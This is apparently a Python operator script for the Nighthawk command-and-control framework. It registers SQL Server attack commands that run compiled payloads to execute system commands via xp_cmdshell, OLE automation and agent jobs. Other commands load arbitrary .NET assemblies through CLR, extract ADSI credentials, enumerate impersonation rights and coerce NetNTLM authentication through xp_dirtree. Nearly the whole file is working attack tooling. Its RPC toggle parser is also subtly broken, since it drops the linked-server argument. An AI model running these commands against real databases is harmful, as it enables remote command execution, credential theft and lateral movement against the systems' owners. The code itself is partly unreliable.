# pyright: reportUndefinedVariable=false
from pathlib import Path
import hashlib

######
# Funcs for parameter parsing
######

def long_parse_params( params ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 4:
        nighthawk.console_write( CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 1:
        nighthawk.console_write( CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 1:
        server = params[ 0 ]
    if num_params >= 2:
        database = params[ 1 ]
    if num_params >= 3:
        linkserver = params[ 2 ]
    if num_params >= 4:
        impersonate = params[ 3 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)

    return packer.getbuffer()

def short_parse_params( params ):
    packer = Packer()

    num_params = len(params)
    server      = ""
    database    = ""

    if num_params > 2:
        nighthawk.console_write( CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 1:
        nighthawk.console_write( CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params == 1:
        server = params[ 0 ]
        database = ""
    if num_params == 2:
        server = params[ 0 ]
        database = params[ 1 ]

    packer.addstr(server)
    packer.addstr(database)

    return packer.getbuffer()


def toggle_rpc_parse_params( params, value ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 4:
        nighthawk.console_write( CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 2:
        nighthawk.console_write( CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 1:
        server = params[ 0 ]
    if num_params >= 2:
        linkedserver = params[ 1 ]
    if num_params >= 3:
        database = params[ 2 ]
    if num_params >= 4:
        impersonate = params[ 3 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)
    packer.addstr("rpc")
    packer.addstr(value)

    return packer.getbuffer()


def toggle_mod_parse_params( params, module, value ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 4:
        nighthawk.console_write( CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 1:
        nighthawk.console_write( CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 1:
        server = params[ 0 ]
    if num_params >= 2:
        database = params[ 1 ]
    if num_params >= 3:
        linkserver = params[ 2 ]
    if num_params >= 4:
        impersonate = params[ 3 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)
    packer.addstr(module)
    packer.addstr(value)

    return packer.getbuffer()


def command_parse_params( params ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    command     = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 5:
        nighthawk.console_write( CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 2:
        nighthawk.console_write( CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 1:
        server = params[ 0 ]
    if num_params >= 2:
        command = params[ 1 ]
    if num_params >= 3:
        database = params[ 2 ]
    if num_params >= 4:
        linkserver = params[ 3 ]
    if num_params >= 5:
        impersonate = params[ 4 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)
    packer.addstr(command)

    return packer.getbuffer()


def rows_parse_params( params ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    table       = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 5:
        nighthawk.console_write( CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 2:
        nighthawk.console_write( CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 1:
        server = params[ 0 ]
    if num_params >= 2:
        table = params[ 1 ]
    if num_params >= 3:
        database = params[ 2 ]
    if num_params >= 4:
        linkserver = params[ 3 ]
    if num_params >= 5:
        impersonate = params[ 4 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(table)
    packer.addstr(linkserver)
    packer.addstr(impersonate)

    return packer.getbuffer()


def clr_parse_params( params ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    dllpath     = ""
    function    = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 6:
        nighthawk.console_write( CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 3:
        nighthawk.console_write( CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 3:
        server      = params[ 0 ]
        dllpath     = params[ 1 ]
        function    = params[ 2 ]
    if num_params >= 4:
        database = params[ 3 ]
    if num_params >= 5:
        linkserver = params[ 4 ]
    if num_params >= 6:
        impersonate = params[ 5 ]

    dll = Path(dllpath)
    if not dll.is_file():
        nighthawk.console_write( CONSOLE_ERROR, f"DLL {dllpath} not found" )
        return None
        
    dllbytes = dll.read_bytes()
    hash_obj = hashlib.sha512(dllbytes)
    digest = hash_obj.hexdigest()

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)
    packer.addstr(function)
    packer.addstr(digest)
    packer.addbytes(dllbytes)

    return packer.getbuffer()


def adsi_parse_params( params ):
    packer = Packer()

    num_params = len(params)
    
    server      = ""
    adsiserver  = ""
    port        = ""
    database    = ""
    linkserver  = ""
    impersonate = ""

    if num_params > 6:
        nighthawk.console_write( CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 2:
        nighthawk.console_write( CONSOLE_ERROR, "Too few parameters" )
        return None

    if num_params >= 2:
        server      = params[ 0 ]
        adsiserver  = params[ 1 ]
    if num_params >= 3:
        port = params[ 2 ]
    if num_params >= 4:
        database = params[ 3 ]
    if num_params >= 5:
        linkserver = params[ 4 ]
    if num_params >= 6:
        impersonate = params[ 5 ]

    packer.addstr(server)
    packer.addstr(database)
    packer.addstr(linkserver)
    packer.addstr(impersonate)
    packer.addstr(adsiserver)
    packer.addstr(port)

    return packer.getbuffer()


def enum1434_parse_params( params ):
    packer = Packer()

    num_params = len(params)
    
    server = ""

    if num_params > 1:
        nighthawk.console_write( CONSOLE_ERROR, "Too many parameters" )
        return None

    if num_params < 1:
        nighthawk.console_write( CONSOLE_ERROR, "Too few parameters" )
        return None

    server = params[ 0 ]

    packer.addstr(server)

    return packer.getbuffer()
    

######
# Funcs for commands
######

def enum1434( params, info ):
    with open(nighthawk.script_resource(f"SQL/1434udp/1434udp.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = enum1434_parse_params( params )
    if packed_params is None:
        return False

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to obtain SQL Server connection information" )

    api.execute_bof( f"SQL/1434udp/1434udp.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def adsi( params, info ):
    with open(nighthawk.script_resource(f"SQL/adsi/adsi.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = adsi_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to obtain ADSI creds from ADSI linked server" )

    api.execute_bof( f"SQL/adsi/adsi.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def agentcmd( params, info ):
    with open(nighthawk.script_resource(f"SQL/agentcmd/agentcmd.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = command_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to execute a system command using agent jobs" )

    api.execute_bof( f"SQL/agentcmd/agentcmd.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )

def agentstatus( params, info ):
    with open(nighthawk.script_resource(f"SQL/agentstatus/agentstatus.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = long_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enumerate SQL agent status and jobs" )

    api.execute_bof( f"SQL/agentstatus/agentstatus.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def checkrpc( params, info ):
    with open(nighthawk.script_resource(f"SQL/checkrpc/checkrpc.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = long_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enumerate RPC status of linked servers" )

    api.execute_bof( f"SQL/checkrpc/checkrpc.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def clr( params, info ):
    with open(nighthawk.script_resource(f"SQL/clr/clr.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = clr_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to load and execute a .NET assembly in a stored procedure" )

    api.execute_bof( f"SQL/clr/clr.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def columns( params, info ):
    with open(nighthawk.script_resource(f"SQL/columns/columns.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = rows_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enumerate columns within a table" )

    api.execute_bof( f"SQL/columns/columns.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def databases( params, info ):
    with open(nighthawk.script_resource(f"SQL/databases/databases.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = long_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enumerate SQL databases" )

    api.execute_bof( f"SQL/databases/databases.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def disableclr( params, info ):
    with open(nighthawk.script_resource(f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = toggle_mod_parse_params( params, "clr enabled", "0" )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to disable CLR integration" )

    api.execute_bof( f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def disableole( params, info ):
    with open(nighthawk.script_resource(f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = toggle_mod_parse_params( params, "Ole Automation Procedures", "0" )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to disable OLE automation procedures" )

    api.execute_bof( f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def disablerpc( params, info ):
    with open(nighthawk.script_resource(f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = toggle_rpc_parse_params( params, "FALSE" )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to disable RPC and RPC out on a linked server" )

    api.execute_bof( f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def disablexp( params, info ):
    with open(nighthawk.script_resource(f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = toggle_mod_parse_params( params, "xp_cmdshell", "0" )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to disable xp_cmdshell" )

    api.execute_bof( f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def enableclr( params, info ):
    with open(nighthawk.script_resource(f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = toggle_mod_parse_params( params, "clr enabled", "1" )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enable CLR integration" )

    api.execute_bof( f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def enableole( params, info ):
    with open(nighthawk.script_resource(f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = toggle_mod_parse_params( params, "Ole Automation Procedures", "1" )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enable OLE automation procedures" )

    api.execute_bof( f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def enablerpc( params, info ):
    with open(nighthawk.script_resource(f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = toggle_rpc_parse_params( params, "TRUE" )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enable RPC and RPC out on a linked server" )

    api.execute_bof( f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def enablexp( params, info ):
    with open(nighthawk.script_resource(f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = toggle_mod_parse_params( params, "xp_cmdshell", "1" )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enable xp_cmdshell" )

    api.execute_bof( f"SQL/togglemodule/togglemodule.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def impersonate( params, info ):
    with open(nighthawk.script_resource(f"SQL/impersonate/impersonate.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = short_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enumerate users that can be impersonated" )

    api.execute_bof( f"SQL/impersonate/impersonate.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def links( params, info ):
    with open(nighthawk.script_resource(f"SQL/links/links.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = long_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enumerate linked servers" )

    api.execute_bof( f"SQL/links/links.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def olecmd( params, info ):
    with open(nighthawk.script_resource(f"SQL/olecmd/olecmd.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = command_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to execute a system command using OLE automation procedures" )

    api.execute_bof( f"SQL/olecmd/olecmd.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def query( params, info ):
    with open(nighthawk.script_resource(f"SQL/query/query.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = command_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to execute a custom SQL query" )

    api.execute_bof( f"SQL/query/query.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def rows( params, info ):
    with open(nighthawk.script_resource(f"SQL/rows/rows.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = rows_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to gather SQL table rows" )

    api.execute_bof( f"SQL/rows/rows.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def search( params, info ):
    with open(nighthawk.script_resource(f"SQL/search/search.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = command_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to gather SQL table Search" )

    api.execute_bof( f"SQL/search/search.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def smb( params, info ):
    with open(nighthawk.script_resource(f"SQL/smb/smb.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = command_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to coerce NetNTLM auth via xp_dirtree" )

    api.execute_bof( f"SQL/smb/smb.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def sql_info( params, info ):
    with open(nighthawk.script_resource(f"SQL/info/info.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = short_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enumerate SQL info" )

    api.execute_bof( f"SQL/info/info.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def tables( params, info ):
    with open(nighthawk.script_resource(f"SQL/tables/tables.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = long_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enumerate tables within a database" )

    api.execute_bof( f"SQL/tables/tables.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def users( params, info ):
    with open(nighthawk.script_resource(f"SQL/users/users.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = long_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to enumerate users with database access" )

    api.execute_bof( f"SQL/users/users.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def whoami( params, info ):
    with open(nighthawk.script_resource(f"SQL/whoami/whoami.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = long_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to gather logged in user, mapped user and roles" )

    api.execute_bof( f"SQL/whoami/whoami.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


def xpcmd( params, info ):
    with open(nighthawk.script_resource(f"SQL/xpcmd/xpcmd.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    packed_params = command_parse_params( params )
    if packed_params is None:
        return

    nighthawk.console_write( CONSOLE_INFO, "Tasked nighthawk to execute a system command via xp_cmdshell" )

    api.execute_bof( f"SQL/xpcmd/xpcmd.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, "", show_in_console=True )


nighthawk.register_command( enum1434,      "sql-1434udp",      "BOF - Obtain SQL Server connection information from 1434/UDP",   "BOF - Obtain SQL Server connection information from 1434/UDP",   "[server IP]",                                                                                       "" )
nighthawk.register_command( adsi,          "sql-adsi",         "BOF - Obtain ADSI creds from ADSI linked server",                "BOF - Obtain ADSI creds from ADSI linked server",                "[server] [ADSI_linkedserver] [opt: port] [opt: database] [opt: linkedserver] [opt: impersonate]",   "" )
nighthawk.register_command( agentcmd,      "sql-agentcmd",     "BOF - Execute a system command using agent jobs",                "BOF - Execute a system command using agent jobs",                "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
nighthawk.register_command( agentstatus,   "sql-agentstatus",  "BOF - Enumerate SQL agent status and jobs",                      "BOF - Enumerate SQL agent status and jobs",                      "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( checkrpc,      "sql-checkrpc",     "BOF - Enumerate RPC status of linked servers",                   "BOF - Enumerate RPC status of linked servers",                   "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( clr,           "sql-clr",          "BOF - Load and execute .NET assembly in a stored procedure",     "BOF - Load and execute .NET assembly in a stored procedure",     "[server] [dll_path] [function] [opt: database] [opt: linkedserver] [opt: impersonate]",             "" )
nighthawk.register_command( columns,       "sql-columns",      "BOF - Enumerate columns within a table",                         "BOF - Enumerate columns within a table",                         "[server] [tables] [opt: database] [opt: linkedserver] [opt: impersonate]",                          "" )
nighthawk.register_command( databases,     "sql-databases",    "BOF - Enumerate SQL databases",                                  "BOF - Enumerate SQL databases",                                  "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( disableclr,    "sql-disableclr",   "BOF - Disable CLR integration",                                   "BOF - Disable CLR integration",                                 "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )	
nighthawk.register_command( disableole,    "sql-disableole",   "BOF - Disable OLE Automation Procedures",	                      "BOF - Disable OLE Automation Procedures",	                   "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )	
nighthawk.register_command( disablerpc,    "sql-disablerpc",   "BOF - Disable RPC and RPC out on a linked server",               "BOF - Disable RPC and RPC out on a linked server",               "[server] [linkedserver] [opt: database] [opt: impersonate]",                                        "" )
nighthawk.register_command( disablexp,     "sql-disablexp",    "BOF - Disable xp_cmdshell" ,                                     "BOF - Disable xp_cmdshell" ,                                     "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( enableclr,     "sql-enableclr",    "BOF - Enable CLR integration",                                   "BOF - Enable CLR integration",                                   "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( enableole,     "sql-enableole",    "BOF - Enable OLE Automation Procedures",                         "BOF - Enable OLE Automation Procedures",                         "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( enablerpc,     "sql-enablerpc",    "BOF - Enable RPC and RPC out on a linked server",                "BOF - Enable RPC and RPC out on a linked server",                "[server] [linkedserver] [opt: database] [opt: impersonate]",                                        "" )
nighthawk.register_command( enablexp,      "sql-enablexp",     "BOF - Enable xp_cmdshell",                                       "BOF - Enable xp_cmdshell",                                       "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( impersonate,   "sql-impersonate",  "BOF - Enumerate users that can be impersonated",                 "BOF - Enumerate users that can be impersonated",                 "[server] [opt: database]",                                                                          "" )
nighthawk.register_command( sql_info,      "sql-info",         "BOF - Gather information about the SQL server",                  "BOF - Gather information about the SQL server",                  "[server] [opt: database]",                                                                          "" )
nighthawk.register_command( links,         "sql-links",        "BOF - Enumerate linked servers",                                 "BOF - Enumerate linked servers",                                 "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( olecmd,        "sql-olecmd",       "BOF - Execute a system command using OLE automation procedures", "BOF - Execute a system command using OLE automation procedures", "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
nighthawk.register_command( query,         "sql-query",        "BOF - Execute a custom SQL query",                               "BOF - Execute a custom SQL query",                               "[server] [query] [opt: database] [opt: linkedserver] [opt: impersonate]",                           "" )
nighthawk.register_command( rows,          "sql-rows",         "BOF - Get the count of rows in a table",                         "BOF - Get the count of rows in a table",                         "[server] [table] [opt: database] [opt: linkedserver] [opt: impersonate]",                           "" )
nighthawk.register_command( search,        "sql-search",       "BOF - Search a table for a column name",                         "BOF - Search a table for a column name",                         "[server] [keyword] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
nighthawk.register_command( smb,           "sql-smb",          "BOF - Coerce NetNTLM auth via xp_dirtree",                       "BOF - Coerce NetNTLM auth via xp_dirtree",                       "[server] [\\\\listener] [opt: database] [opt: linkedserver] [opt: impersonate]",                    "" )
nighthawk.register_command( tables,        "sql-tables",       "BOF - Enumerate tables within a database",                       "BOF - Enumerate tables within a database",                       "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( users,         "sql-users",        "BOF - Enumerate users with database access",                     "BOF - Enumerate users with database access",                     "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( whoami,        "sql-whoami",       "BOF - Gather logged in user, mapped user and roles",             "BOF - Gather logged in user, mapped user and roles",             "[server] [opt: database] [opt: linkedserver] [opt: impersonate]",                                   "" )
nighthawk.register_command( xpcmd,         "sql-xpcmd",        "BOF - Execute a system command via xp_cmdshell",                 "BOF - Execute a system command via xp_cmdshell",                 "[server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]",                         "" )
